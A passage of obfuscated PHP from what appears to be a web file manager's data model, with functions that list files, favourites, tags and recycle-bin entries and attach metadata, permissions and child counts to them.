"\x66\165\x6e\x63\x74\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($îıÌæº®) { return $this->listSource(array($_SERVER[Æ š¦İÈ][404] => $îıÌæº®)); } public function typeName($’Ò—‚±³) { static $±ÚœˆïÑ = array(self::TYPE_SYSTEM => "\x73\x79\163\164\x65\x6d", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\x67\162\157\x75\x70"); return $±ÚœˆïÑ[$’Ò—‚±³ . $_SERVER[Æ š¦İÈ][12]]; } public function sourceListInfo($¤ƒ¤ÁÃİ, $Ü¼òÁ÷¬ = false) { $ú€Ü¬ã =& $_SERVER[Æ š¦İÈ]; $¤ƒ¤ÁÃİ = $¤ƒ¤ÁÃİ ? $¤ƒ¤ÁÃİ : array(); $¤ƒ¤ÁÃİ = array_filter(array_unique($¤ƒ¤ÁÃİ)); if (!$¤ƒ¤ÁÃİ) { return array(); } $ı’”ã²¶ = $this->where(array($ú€Ü¬ã[405] => array($ú€Ü¬ã[7], $¤ƒ¤ÁÃİ)))->select(); $this->_listDataApply($ı’”ã²¶, $Ü¼òÁ÷¬); return array_to_keyvalue($ı’”ã²¶, $ú€Ü¬ã[405]); } public function pathInfoFilter(&$Ä‚Úúˆ·) { $—åû¤‰’ =& $_SERVER[Æ š¦İÈ]; static $Ÿ¤¼éí = false; static $ñ—ˆ¡ƒæ = false; static $ÄÙÁğõ† = false; if (!$Ÿ¤¼éí) { $·ú„æÎœ = $—åû¤‰’[406]; $·ú„æÎœ .= $—åû¤‰’[407]; $·ú„æÎœ .= $—åû¤‰’[408]; $ä§Ÿœ¤ = $—åû¤‰’[409]; $áŸö½¼ = explode($—åû¤‰’[50], $ä§Ÿœ¤); $Ÿ¤¼éí = explode($—åû¤‰’[50], $·ú„æÎœ); $ñ—ˆ¡ƒæ = array(); foreach ($Ÿ¤¼éí as $‡áü’Îˆ) { if (in_array($‡áü’Îˆ, $áŸö½¼)) { continue; } $ñ—ˆ¡ƒæ[] = $‡áü’Îˆ; } $ÄÙÁğõ† = explode($—åû¤‰’[50], $—åû¤‰’[410]); } foreach ($ÄÙÁğõ† as $Ìè¤…Â™) { if (isset($Ä‚Úúˆ·[$Ìè¤…Â™])) { $Ä‚Úúˆ·[$Ìè¤…Â™] = intval($Ä‚Úúˆ·[$Ìè¤…Â™]); } } $Ä‚Úúˆ·[$—åû¤‰’[78]] = $—åû¤‰’[411] . $Ä‚Úúˆ·[$—åû¤‰’[405]] . $—åû¤‰’[412]; $Ä‚Úúˆ·[$—åû¤‰’[33]] = $Ä‚Úúˆ·[$—åû¤‰’[413]] == 1 ? $—åû¤‰’[79] : $—åû¤‰’[194]; $Ä‚Úúˆ·[$—åû¤‰’[414]] = $this->typeName($Ä‚Úúˆ·[$—åû¤‰’[414]]); if ($Ä‚Úúˆ·[$—åû¤‰’[413]] != 1) { $Ä‚Úúˆ·[$—åû¤‰’[169]] = $Ä‚Úúˆ·[$—åû¤‰’[415]]; unset($Ä‚Úúˆ·[$—åû¤‰’[415]]); } $®™èÎÅ = $Ÿ¤¼éí; if (isset($Ä‚Úúˆ·[$—åû¤‰’[416]]) && $Ä‚Úúˆ·[$—åû¤‰’[416]][$—åû¤‰’[417]] == -1) { $®™èÎÅ = $ñ—ˆ¡ƒæ; } $Ä‚Úúˆ· = array_field_key($Ä‚Úúˆ·, $®™èÎÅ); return $Ä‚Úúˆ·; } public function listUserFav() { $€Ú«À­ú =& $_SERVER[Æ š¦İÈ]; $Ë™™ƒÀ˜ = Model($€Ú«À­ú[418])->listData(); $­¢¨Òçà = array_filter_by_field($Ë™™ƒÀ˜, $€Ú«À­ú[33], $€Ú«À­ú[419]); $­¢¨Òçà = array_to_keyvalue($­¢¨Òçà, $€Ú«À­ú[12], $€Ú«À­ú[78]); if ($­¢¨Òçà) { $Œ¥¹·¸ø = $this->listSource(array($€Ú«À­ú[420] => array($€Ú«À­ú[421], $­¢¨Òçà))); } $Œ¥¹·¸ø = array_to_keyvalue($Œ¥¹·¸ø[$€Ú«À­ú[366]], $€Ú«À­ú[405]); foreach ($Ë™™ƒÀ˜ as &$’«õŸïÓ) { $’«õŸïÓ = array($€Ú«À­ú[422] => $’«õŸïÓ[$€Ú«À­ú[403]], $€Ú«À­ú[423] => $’«õŸïÓ[$€Ú«À­ú[32]], $€Ú«À­ú[424] => $’«õŸïÓ[$€Ú«À­ú[78]], $€Ú«À­ú[425] => $’«õŸïÓ[$€Ú«À­ú[33]], $€Ú«À­ú[426] => $’«õŸïÓ[$€Ú«À­ú[195]], $€Ú«À­ú[427] => $’«õŸïÓ[$€Ú«À­ú[86]]); if ($’«õŸïÓ[$€Ú«À­ú[33]] == $€Ú«À­ú[419] && $Œ¥¹·¸ø[$’«õŸïÓ[$€Ú«À­ú[78]]]) { $’«õŸïÓ[$€Ú«À­ú[87]] = $Œ¥¹·¸ø[$’«õŸïÓ[$€Ú«À­ú[78]]]; } } unset($’«õŸïÓ); return $Ë™™ƒÀ˜; } public function listUserTag($ ı´é£ù) { $£İ€ìÔ =& $_SERVER[Æ š¦İÈ]; if ($ ı´é£ù && !is_array($ ı´é£ù)) { $ ı´é£ù = array($ ı´é£ù); } $Ş˜†–Ùâ = Model($£İ€ìÔ[428])->listData(); $ÍèÃ²–Æ = array(); foreach ($Ş˜†–Ùâ as $Çş‘¥şŠ) { $À¢¢ÄøÏ = $Çş‘¥şŠ[$£İ€ìÔ[78]]; if (!$À¢¢ÄøÏ) { continue; } if (!isset($ÍèÃ²–Æ[$À¢¢ÄøÏ])) { $ÍèÃ²–Æ[$À¢¢ÄøÏ] = array(); } $ÍèÃ²–Æ[$À¢¢ÄøÏ][] = $Çş‘¥şŠ[$£İ€ìÔ[429]]; } $õ÷™ñø­ = array(); foreach ($ÍèÃ²–Æ as $†Ú±¨ Ê => $¨ÒÅãÃ) { $²ÜŠø—ù = !0; if (!$ ı´é£ù) { $õ÷™ñø­[] = $†Ú±¨ Ê; continue; } foreach ($ ı´é£ù as $›àæì¸ı) { if (!in_array($›àæì¸ı, $¨ÒÅãÃ)) { $²ÜŠø—ù = !1; break; } } if ($²ÜŠø—ù) { $õ÷™ñø­[] = $†Ú±¨ Ê; } } if (!$õ÷™ñø­) { return array(); } $Êö§¸âÏ = $this->listSource(array($£İ€ìÔ[420] => array($£İ€ìÔ[421], $õ÷™ñø­))); if (!$Êö§¸âÏ || count($õ÷™ñø­) == $Êö§¸âÏ[$£İ€ìÔ[363]][$£İ€ìÔ[364]]) { return $Êö§¸âÏ; } $œéîÖ™ = array(); $Œ»¿¦ü£ = array_to_keyvalue($Êö§¸âÏ[$£İ€ìÔ[77]], $£İ€ìÔ[12], $£İ€ìÔ[405]); $³ºì‹«Å = array_to_keyvalue($Êö§¸âÏ[$£İ€ìÔ[76]], $£İ€ìÔ[12], $£İ€ìÔ[405]); $¾ôˆùŞ = array_merge($³ºì‹«Å, $Œ»¿¦ü£); foreach ($õ÷™ñø­ as $À¢¢ÄøÏ) { if (!in_array($À¢¢ÄøÏ, $¾ôˆùŞ)) { $œéîÖ™[] = $À¢¢ÄøÏ; } } if ($œéîÖ™) { Model($£İ€ìÔ[430])->removeBySource($œéîÖ™); } return $Êö§¸âÏ; } public function listUserRecycle() { $ó¦ç—‹ú =& $_SERVER[Æ š¦İÈ]; $”ÕçÎ = Model($ó¦ç—‹ú[431])->listData(); if (!$”ÕçÎ) { return array(); } $“ÖßŸØÄ = array($ó¦ç—‹ú[420] => array($ó¦ç—‹ú[421], $”ÕçÎ), $ó¦ç—‹ú[432] => 1); return $this->listSource($“ÖßŸØÄ); } public function listSource($û™³Ìº, $êóâ€¼½ = 3000) { $˜Ôì«÷– =& $_SERVER[Æ š¦İÈ]; if (!isset($û™³Ìº[$˜Ôì«÷–[433]])) { $û™³Ìº[$˜Ôì«÷–[433]] = 0; } $÷É÷©¢î = $˜Ôì«÷–[434]; $õ•ºìß† = $this->field($÷É÷©¢î)->_makeOrder()->where($û™³Ìº)->selectPage($êóâ€¼½); $this->_listPageCheck($õ•ºìß†, $÷É÷©¢î, $û™³Ìº); $this->_listDataApply($õ•ºìß†[$˜Ôì«÷–[366]]); $this->_listMake($õ•ºìß†); return $õ•ºìß†; } private function _listPageCheck(&$Ó£ğ÷óå, $¬‡±•ÍÂ, $êûµóêß) { $ÂËïĞ² =& $_SERVER[Æ š¦İÈ]; if (!is_array($Ó£ğ÷óå[$ÂËïĞ²[363]])) { return; } $¾ıŠ‰™ = $Ó£ğ÷óå[$ÂËïĞ²[363]]; if ($¾ıŠ‰™[$ÂËïĞ²[365]] <= 1) { return; } if ($¾ıŠ‰™[$ÂËïĞ²[364]] >= 100000) { return; } if (Model($ÂËïĞ²[435])->get($ÂËïĞ²[436]) != $ÂËïĞ²[437]) { return; } $¬‡±•ÍÂ = str_replace(array($ÂËïĞ²[53], $ÂËïĞ²[339], $ÂËïĞ²[228]), $ÂËïĞ²[12], $¬‡±•ÍÂ); $¬‡±•ÍÂ = $ÂËïĞ²[438] . str_replace($ÂËïĞ²[50], $ÂËïĞ²[439], $¬‡±•ÍÂ) . $ÂËïĞ²[440]; $‡œÇ˜ùƒ = $ÂËïĞ²[441]; $‡œÇ˜ùƒ = $‡œÇ˜ùƒ . $ÂËïĞ²[442]; $Å‘¸‹è¯ = $¾ıŠ‰™[$ÂËïĞ²[360]] * ($¾ıŠ‰™[$ÂËïĞ²[350]] - 1) . $ÂËïĞ²[50] . $¾ıŠ‰™[$ÂËïĞ²[360]]; $öôÁÅùÑ = $this->_makeOrder(!0); $Çæõ€ÉÀ = $ÂËïĞ²[438] . str_replace($ÂËïĞ²[50], $ÂËïĞ²[439], $öôÁÅùÑ[0]); if (strpos($Çæõ€ÉÀ, $ÂËïĞ²[443])) { $Çæõ€ÉÀ = str_replace($ÂËïĞ²[443], $ÂËïĞ²[444], $Çæõ€ÉÀ); } else { $Çæõ€ÉÀ .= $ÂËïĞ²[445] . $öôÁÅùÑ[1]; } $ı÷êäìè = array(); foreach ($êûµóêß as $ß§şĞê® => $±şºıç§) { $ı÷êäìè[$ÂËïĞ²[438] . $ß§şĞê®] = $±şºıç§; } $this->alias($ÂËïĞ²[446])->field($¬‡±•ÍÂ)->limit($Å‘¸‹è¯)->order($Çæõ€ÉÀ); $óëÚ—Ê‹ = $this->join($‡œÇ˜ùƒ)->where($ı÷êäìè)->select(); if ($óëÚ—Ê‹) { $Ó£ğ÷óå[$ÂËïĞ²[366]] = $óëÚ—Ê‹; } } protected function _makeOrder($ÑÛ„çÔ‚ = false) { $ÖÅÔ†ï =& $_SERVER[Æ š¦İÈ]; $½£‚Øßç = Model($ÖÅÔ†ï[447])->get($ÖÅÔ†ï[448]); $ÕïÇíåÃ = Model($ÖÅÔ†ï[447])->get($ÖÅÔ†ï[449]); $¼«×†•Û = array($ÖÅÔ†ï[450] => $ÖÅÔ†ï[451], $ÖÅÔ†ï[452] => $ÖÅÔ†ï[453]); $Ş¹ªíúé = array($ÖÅÔ†ï[32] => $ÖÅÔ†ï[32], $ÖÅÔ†ï[80] => $ÖÅÔ†ï[80], $ÖÅÔ†ï[169] => $ÖÅÔ†ï[415], $ÖÅÔ†ï[454] => $ÖÅÔ†ï[454], $ÖÅÔ†ï[455] => $ÖÅÔ†ï[456], $ÖÅÔ†ï[195] => $ÖÅÔ†ï[195], $ÖÅÔ†ï[86] => $ÖÅÔ†ï[86]); $ğ¦ŸÉ˜™ = Input::get($ÖÅÔ†ï[457], $ÖÅÔ†ï[7], $½£‚Øßç, array_keys($Ş¹ªíúé)); $¼²‚Ñ§® = Input::get($ÖÅÔ†ï[458], $ÖÅÔ†ï[7], $ÕïÇíåÃ, array_keys($¼«×†•Û)); if (!in_array($ğ¦ŸÉ˜™, array_keys($Ş¹ªíúé))) { $ğ¦ŸÉ˜™ = $ÖÅÔ†ï[32]; } if (!in_array($¼²‚Ñ§®, array_keys($¼«×†•Û))) { $ğ¦ŸÉ˜™ = $ÖÅÔ†ï[450]; } if ($ğ¦ŸÉ˜™ == $ÖÅÔ†ï[32]) { } $‚ğØøïŠ = $ÖÅÔ†ï[459] . $Ş¹ªíúé[$ğ¦ŸÉ˜™] . $ÖÅÔ†ï[53] . $¼«×†•Û[$¼²‚Ñ§®]; $‚ğØøïŠ = rtrim(trim($‚ğØøïŠ), $ÖÅÔ†ï[50]); if ($ÑÛ„çÔ‚) { return array($‚ğØøïŠ, $¼«×†•Û[$¼²‚Ñ§®]); } return $this->order($‚ğØøïŠ); } protected function _listDataApplyItem($êÁ†üôÕ, $ÈÇ÷›‹ú = false) { $ˆö ¯äš = array($êÁ†üôÕ); $this->_listDataApply($ˆö ¯äš, $ÈÇ÷›‹ú); return $ˆö ¯äš[0]; } protected function _listDataApply(&$Ÿ­´¾œå, $¤ÔÈ•©ƒ = false) { $±óÓ¡© =& $_SERVER[Æ š¦İÈ]; if (!$Ÿ­´¾œå) { $Ÿ­´¾œå = array(); return; } $†¼à¤Ë = array_to_keyvalue($Ÿ­´¾œå, $±óÓ¡©[12], $±óÓ¡©[405]); $†¼à¤Ë = array_unique($†¼à¤Ë); $this->_listSourceCache($Ÿ­´¾œå); if (!$¤ÔÈ•©ƒ) { $this->_listAppendMeta($Ÿ­´¾œå, $†¼à¤Ë); $this->_listAppendFileMeta($Ÿ­´¾œå, $†¼à¤Ë); $this->_listAppendChildren($Ÿ­´¾œå, $†¼à¤Ë); } $this->_listAppendPath($Ÿ­´¾œå); $this->_listAppendAuth($Ÿ­´¾œå); $this->_listAppendSourceInfo($Ÿ­´¾œå, $†¼à¤Ë); $this->_listAppendUser($Ÿ­´¾œå); $this->_listFilterInfo($Ÿ­´¾œå, $¤ÔÈ•©ƒ); $this->_listAppendAuthSecret($Ÿ­´¾œå); } protected function _listSourceCache($‚²ôıñ) { $ğ–Äá‚ =& $_SERVER[Æ š¦İÈ]; foreach ($‚²ôıñ as $áô…Òâë) { self::$cacheSourceInfo[$ğ–Äá‚[460] . $áô…Òâë[$ğ–Äá‚[405]]] = $áô…Òâë; } } protected function _listFilterInfo(&$¸ÓËÕ, $ÕôÌÓÎ× = false) { $—Åş²²ç =& $_SERVER[Æ š¦İÈ]; foreach ($¸ÓËÕ as &$Ü‰úÛ·“) { $Ü‰úÛ·“ = $this->pathInfoFilter($Ü‰úÛ·“); self::$cachePathInfo[$—Åş²²ç[461] . intval($ÕôÌÓÎ×) . $—Åş²²ç[462] . $Ü‰úÛ·“[$—Åş²²ç[405]]] = $Ü‰úÛ·“; } unset($Ü‰úÛ·“); } protected function _listMake(&$êè„¾ÈÄ) { $­Ï½•³Æ =& $_SERVER[Æ š¦İÈ]; $êè„¾ÈÄ[$­Ï½•³Æ[77]] = array(); $êè„¾ÈÄ[$­Ï½•³Æ[76]] = array(); foreach ($êè„¾ÈÄ[$­Ï½•³Æ[366]] as $ãëâ§ú‚) { $îÒåé¾“ = $ãëâ§ú‚[$­Ï½•³Æ[413]] == 1 ? $­Ï½•³Æ[77] : $­Ï½•³Æ[76]; $êè„¾ÈÄ[$îÒåé¾“][] = $ãëâ§ú‚; } unset($êè„¾ÈÄ[$­Ï½•³Æ[366]]); } protected function _listAppendMeta(&$şçÁ¿å†, $°ŸÎ¯õ) { $¡¿–ËÉ¬ =& $_SERVER[Æ š¦İÈ]; $ÓÈ¶¬Œú = array($¡¿–ËÉ¬[420] => array($¡¿–ËÉ¬[421], $°ŸÎ¯õ)); $øÃÆŒŠÆ = Model($¡¿–ËÉ¬[463])->field($¡¿–ËÉ¬[464])->where($ÓÈ¶¬Œú)->select(); if (!$øÃÆŒŠÆ) { return; } $â´Õª º = array($¡¿–ËÉ¬[465], $¡¿–ËÉ¬[466], $¡¿–ËÉ¬[444]); $…¤ô«·‚ = array(); foreach ($øÃÆŒŠÆ as $Ãê¼Ö€Ö) { if (!isset($…¤ô«·‚[$Ãê¼Ö€Ö[$¡¿–ËÉ¬[405]]])) { $…¤ô«·‚[$Ãê¼Ö€Ö[$¡¿–ËÉ¬[405]]] = array(); } if (in_array($Ãê¼Ö€Ö[$¡¿–ËÉ¬[95]], $â´Õª º)) { continue; } $…¤ô«·‚[$Ãê¼Ö€Ö[$¡¿–ËÉ¬[405]]][$Ãê¼Ö€Ö[$¡¿–ËÉ¬[95]]] = $Ãê¼Ö€Ö[$¡¿–ËÉ¬[371]]; } foreach ($şçÁ¿å† as &$Šğ£) { $Šğ£[$¡¿–ËÉ¬[467]] = !1; if (isset($…¤ô«·‚[$Šğ£[$¡¿–ËÉ¬[405]]])) { $Šğ£[$¡¿–ËÉ¬[467]] = $…¤ô«·‚[$Šğ£[$¡¿–ËÉ¬[405]]]; } if ($this->fileIsLock($Šğ£) && $Šğ£[$¡¿–ËÉ¬[416]]) { $­¬Åµà¢ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Šğ£[$¡¿–ËÉ¬[416]][$¡¿–ËÉ¬[417]] = AuthModel::authDisable($Šğ£[$¡¿–ËÉ¬[416]][$¡¿–ËÉ¬[417]], $­¬Åµà¢); $Šğ£[$¡¿–ËÉ¬[416]][$¡¿–ËÉ¬[468]][$¡¿–ËÉ¬[416]] = $Šğ£[$¡¿–ËÉ¬[416]][$¡¿–ËÉ¬[417]]; } } unset($Šğ£); } protected function _listAppendFileMeta(&$…¸»Äúµ, $š–İøœ) { $ıááÒ =& $_SERVER[Æ š¦İÈ]; $Ö÷ğÂ‚é = array_to_keyvalue($…¸»Äúµ, $ıááÒ[12], $ıááÒ[469]); $Ö÷ğÂ‚é = array_filter(array_unique($Ö÷ğÂ‚é)); if (!$Ö÷ğÂ‚é) { return; } $áê”²ï = array($ıááÒ[470] => array($ıááÒ[421], $Ö÷ğÂ‚é)); $ÁµÈâ‚¸ = $ıááÒ[471]; $…²©§äã = Model($ıááÒ[472])->field($ÁµÈâ‚¸)->where($áê”²ï)->select(); $…²©§äã = array_to_keyvalue($…²©§äã, $ıááÒ[469]); $ƒŒ¡™ù = Model($ıááÒ[473])->field($ıááÒ[474])->where($áê”²ï)->select(); $ƒŒ¡™ù = $ƒŒ¡™ù ? $ƒŒ¡™ù : array(); $ ˜ÑÛ× = array(); foreach ($ƒŒ¡™ù as $ËÏŞí’ó) { if (!isset($ ˜ÑÛ×[$ËÏŞí’ó[$ıááÒ[469]]])) { $ ˜ÑÛ×[$ËÏŞí’ó[$ıááÒ[469]]] = array(); } $ ˜ÑÛ×[$ËÏŞí’ó[$ıááÒ[469]]][$ËÏŞí’ó[$ıááÒ[95]]] = $ËÏŞí’ó[$ıááÒ[371]]; } foreach ($…¸»Äúµ as &$òé³½Û») { $…½é‘è› = $òé³½Û»[$ıááÒ[469]]; if (!$…½é‘è› || !is_array($…²©§äã[$…½é‘è›])) { continue; } $¾ñ²ªÉ = $…²©§äã[$…½é‘è›]; $¾ñ²ªÉ[$ıááÒ[80]] = $òé³½Û»[$ıááÒ[80]]; $¾ñ²ªÉ[$ıááÒ[32]] = $òé³½Û»[$ıááÒ[32]]; if (!isset(self::$cacheFileInfo[$ıááÒ[475] . $…½é‘è›])) { self::$cacheFileInfo[$ıááÒ[475] . $…½é‘è›] = array_merge(array(), $¾ñ²ªÉ); } unset($…²©§äã[$…½é‘è›][$ıááÒ[78]]); $Â£™ÎÉ = is_array($ ˜ÑÛ×[$…½é‘è›]) ? $ ˜ÑÛ×[$…½é‘è›] : array(); $òé³½Û»[$ıááÒ[165]] = array_merge($Â£™ÎÉ, $…²©§äã[$…½é‘è›]); if (isset($òé³½Û»[$ıááÒ[165]][$ıááÒ[164]])) { $òé³½Û»[$ıááÒ[164]] = json_decode($òé³½Û»[$ıááÒ[165]][$ıááÒ[164]], !0); unset($òé³½Û»[$ıááÒ[165]][$ıááÒ[164]]); } } unset($òé³½Û»); } protected function _listAppendSourceInfo(&$Î¾ôº•ë, $¡è¡àÜÒ) { $Ñ è†Û =& $_SERVER[Æ š¦İÈ]; if (!defined($Ñ è†Û[476])) { return; } $Œîş‡œ‚ = Model($Ñ è†Û[477])->listData(); $¦Œ÷Ø‘ = Model($Ñ è†Û[428])->listData(); $Î¿ë±ñÙ = Model($Ñ è†Û[418])->listData(); $Ò×‹Ã»à = Model($Ñ è†Û[478])->listSimple(); $ï€Ï¿÷Õ = array_to_keyvalue($Œîş‡œ‚, $Ñ è†Û[403]); $è”–÷È¿ = array_to_keyvalue_group($¦Œ÷Ø‘, $Ñ è†Û[78], $Ñ è†Û[429]); $©æ‚ÜĞ˜ = array_to_keyvalue($Î¿ë±ñÙ, $Ñ è†Û[78]); $§ˆÕÑå” = array_to_keyvalue_group($Ò×‹Ã»à, $Ñ è†Û[405]); foreach ($Î¾ôº•ë as &$¯µà¬ê) { $¯µà¬ê[$Ñ è†Û[87]] = array($Ñ è†Û[479] => 0, $Ñ è†Û[480] => 0, $Ñ è†Û[481] => 0); if (isset($©æ‚ÜĞ˜[$¯µà¬ê[$Ñ è†Û[405]]])) { $¯µà¬ê[$Ñ è†Û[87]][$Ñ è†Û[482]] = 1; $¯µà¬ê[$Ñ è†Û[87]][$Ñ è†Û[483]] = $©æ‚ÜĞ˜[$¯µà¬ê[$Ñ è†Û[405]]][$Ñ è†Û[32]]; } if (isset($è”–÷È¿[$¯µà¬ê[$Ñ è†Û[405]]])) { $¯µà¬ê[$Ñ è†Û[87]][$Ñ è†Û[484]] = array(); foreach ($è”–÷È¿[$¯µà¬ê[$Ñ è†Û[405]]] as $°÷‡Ğ©) { $Ùıƒ›”Ğ = $ï€Ï¿÷Õ[$°÷‡Ğ©]; $¯µà¬ê[$Ñ è†Û[87]][$Ñ è†Û[484]][] = array($Ñ è†Û[485] => $Ùıƒ›”Ğ[$Ñ è†Û[403]], $Ñ è†Û[423] => $Ùıƒ›”Ğ[$Ñ è†Û[32]], $Ñ è†Û[486] => $Ùıƒ›”Ğ[$Ñ è†Û[487]]); } } if (isset($§ˆÕÑå”[$¯µà¬ê[$Ñ è†Û[405]]])) { $¯µà¬ê[$Ñ è†Û[87]][$Ñ è†Û[488]] = array(); foreach ($§ˆÕÑå”[$¯µà¬ê[$Ñ è†Û[405]]] as $š›—®š) { $¯µà¬ê[$Ñ è†Û[87]][$Ñ è†Û[488]] = array($Ñ è†Û[489] => $š›—®š[$Ñ è†Û[490]], $Ñ è†Û[491] => $š›—®š[$Ñ è†Û[492]], $Ñ è†Û[493] => $š›—®š[$Ñ è†Û[405]], $Ñ è†Û[494] => $š›—®š[$Ñ è†Û[495]], $Ñ è†Û[496] => $š›—®š[$Ñ è†Û[497]], $Ñ è†Û[498] => $š›—®š[$Ñ è†Û[498]], $Ñ è†Û[499] => $š›—®š[$Ñ è†Û[499]]); } } } unset($¯µà¬ê); return $Î¾ôº•ë; } protected function _listAppendChildren(&$ŞÑ²¡ƒ, $ã÷ñúĞã) { $ã–ü‰÷À =& $_SERVER[Æ š¦İÈ]; $¤ßÏÚÛß = array(); $ñ›É§¤” = array($ã–ü‰÷À[204] => 0, $ã–ü‰÷À[205] => 0); foreach ($ŞÑ²¡ƒ as &$¦‹¼’²€) { if (!$¦‹¼’²€[$ã–ü‰÷À[413]]) { continue; } $¤ßÏÚÛß[] = $¦‹¼’²€[$ã–ü‰÷À[405]]; } unset($¦‹¼’²€); if (!$¤ßÏÚÛß) { return; } $ªç‚ûÜŠ = array($ã–ü‰÷À[500] => array($ã–ü‰÷À[7], $¤ßÏÚÛß)); $è›Õê  = array($ã–ü‰÷À[500], $ã–ü‰÷À[413], $ã–ü‰÷À[501] => $ã–ü‰÷À[502]); $é×ÛÔ£Æ = $this->field($è›Õê )->where($ªç‚ûÜŠ)->group($ã–ü‰÷À[503])->select(); $áÚÉÀ’õ = array(); foreach ($é×ÛÔ£Æ as $¢şé”Å©) { $Á¹Ç‰Ñå = $¢şé”Å©[$ã–ü‰÷À[500]]; $‹¤üòÒ = $¢şé”Å©[$ã–ü‰÷À[413]] == $ã–ü‰÷À[89] ? $ã–ü‰÷À[205] : $ã–ü‰÷À[204]; if (!isset($áÚÉÀ’õ[$Á¹Ç‰Ñå])) { $áÚÉÀ’õ[$Á¹Ç‰Ñå] = array($ã–ü‰÷À[204] => 0, $ã–ü‰÷À[205] => 0); } $áÚÉÀ’õ[$Á¹Ç‰Ñå][$‹¤üòÒ] += $¢şé”Å©[$ã–ü‰÷À[502]]; } foreach ($ŞÑ²¡ƒ as &$¦‹¼’²€) { if (!$¦‹¼’²€[$ã–ü‰÷À[413]]) { continue; } $ŞªÀØ†† = is_array($áÚÉÀ’õ[$¦‹¼’²€[$ã–ü‰÷À[405]]]) ? $áÚÉÀ’õ[$¦‹¼’²€[$ã–ü‰÷À[405]]] : $ñ›É§¤”; $¦‹¼’²€[$ã–ü‰÷À[205]] = $ŞªÀØ††[$ã–ü‰÷À[205]]; $¦‹¼’²€[$ã–ü‰÷À[204]] = $ŞªÀØ††[$ã–ü‰÷À[204]]; unset($¦‹¼’²€[$ã–ü‰÷À[415]]); } unset($¦‹¼’²€); } protected function _listAppendAuth(&$äéôƒòÍ) { $É¼½ªêü =& $_SERVER[Æ š¦İÈ]; if (!defined($É¼½ªêü[476])) { return; } $ÃËĞ†Æµ = array(); foreach ($äéôƒòÍ as $£à£ùÊ©) { if ($£à£ùÊ©[$É¼½ªêü[414]] == self::TYPE_GROUP) { $ÃËĞ†Æµ[] = $£à£ùÊ©[$É¼½ªêü[405]]; } } if (!$ÃËĞ†Æµ) { return; } $´€£„¾ = array_to_keyvalue($äéôƒòÍ, $É¼½ªêü[405]); $¦­Ş¶Ò‘ = Model($É¼½ªêü[504])->getSourceList($ÃËĞ†Æµ, $´€£„¾); foreach ($äéôƒòÍ as $’™ıõ¦½ => &$£à£ùÊ©) { $£à£ùÊ©[$É¼½ªêü[416]] = $¦­Ş¶Ò‘[$£à£ùÊ©[$É¼½ªêü[405]]]; if (!$£à£ùÊ©[$É¼½ªêü[416]] && $£à£ùÊ©[$É¼½ªêü[414]] == self::TYPE_GROUP) { $£à£ùÊ©[$É¼½ªêü[416]] = Action($É¼½ªêü[505])->pathGroupAuthMake($£à£ùÊ©[$É¼½ªêü[506]]); if (!$£à£ùÊ©[$É¼½ªêü[416]] && !_get($GLOBALS, $É¼½ªêü[507])) { $£à£ùÊ©[$É¼½ªêü[197]] = !1; $£à£ùÊ©[$É¼½ªêü[196]] = !1; } } if ($£à£ùÊ©[$É¼½ªêü[416]]) { $£à£ùÊ©[$É¼½ªêü[197]] = AuthModel::authCheckEdit($£à£ùÊ©[$É¼½ªêü[416]][$É¼½ªêü[417]]); $£à£ùÊ©[$É¼½ªêü[196]] = AuthModel::authCheckView($£à£ùÊ©[$É¼½ªêü[416]][$É¼½ªêü[417]]); } $this->groupPathDisplay($£à£ùÊ©); } unset($£à£ùÊ©); } public function _listAppendAuthSecret(&$›ãâİ—‘) { $°Ä¨‡úı =& $_SERVER[Æ š¦İÈ]; if (Model($°Ä¨‡úı[435])->get($°Ä¨‡úı[508]) != $°Ä¨‡úı[89]) { return; } static $Ï‚“ò† = false; if (!$Ï‚“ò†) { $ÅÑ²¢¡ = Model($°Ä¨‡úı[509]); $¼À€‘´ = Model($°Ä¨‡úı[510]); $Ï‚“ò† = $¼À€‘´->listData(); $Ï‚“ò† = array_to_keyvalue($Ï‚“ò†, $°Ä¨‡úı[405]); $’‚·Õª = json_decode(Model($°Ä¨‡úı[435])->get($°Ä¨‡úı[511]), !0); $’‚·Õª = array_to_keyvalue($’‚·Õª, $°Ä¨‡úı[403]); foreach ($Ï‚“ò† as $èšŞ¥ş“ => $ê‚Ÿ‰) { $¢€ïÓ³Ó = $’‚·Õª[$ê‚Ÿ‰[$°Ä¨‡úı[512]]]; if (!$¢€ïÓ³Ó) { $¼À€‘´->remove($ê‚Ÿ‰[$°Ä¨‡úı[403]]); unset($Ï‚“ò†[$èšŞ¥ş“]); continue; } $Êóä… = $ÅÑ²¢¡->listData($¢€ïÓ³Ó[$°Ä¨‡úı[416]]); if (!$Êóä…) { $¼À€‘´->remove($ê‚Ÿ‰[$°Ä¨‡úı[403]]); unset($Ï‚“ò†[$èšŞ¥ş“]); continue; } $ê‚Ÿ‰[$°Ä¨‡úı[416]] = $Êóä…; $ê‚Ÿ‰[$°Ä¨‡úı[513]] = $¢€ïÓ³Ó; $ê‚Ÿ‰[$°Ä¨‡úı[514]] = Model($°Ä¨‡úı[515])->getInfoSimpleOuter($ê‚Ÿ‰[$°Ä¨‡úı[454]]); $Ï‚“ò†[$èšŞ¥ş“] = $ê‚Ÿ‰; } } $ª ã—æ½ = defined($°Ä¨‡úı[516]) ? USER_ID : $°Ä¨‡úı[12]; $•Â Â»™ = array(); $€õÅì€œ = $this->_listAppendPath($•Â Â»™, !0); foreach ($›ãâİ—‘ as $èšŞ¥ş“ => &$ê‚Ÿ‰) { if (!is_array($ê‚Ÿ‰[$°Ä¨‡úı[416]])) { continue; } if ($ê‚Ÿ‰[$°Ä¨‡úı[414]] != $°Ä¨‡úı[517]) { continue; } if (isset($Ï‚“ò†[$ê‚Ÿ‰[$°Ä¨‡úı[405]]])) { $»îËß¯¤ = $Ï‚“ò†[$ê‚Ÿ‰[$°Ä¨‡úı[405]]]; if (!is_array($ê‚Ÿ‰[$°Ä¨‡úı[467]])) { $ê‚Ÿ‰[$°Ä¨‡úı[467]] = array(); } $ê‚Ÿ‰[$°Ä¨‡úı[467]][$°Ä¨‡úı[518]] = $»îËß¯¤[$°Ä¨‡úı[512]]; $ê‚Ÿ‰[$°Ä¨‡úı[416]][$°Ä¨‡úı[519]] = $»îËß¯¤; 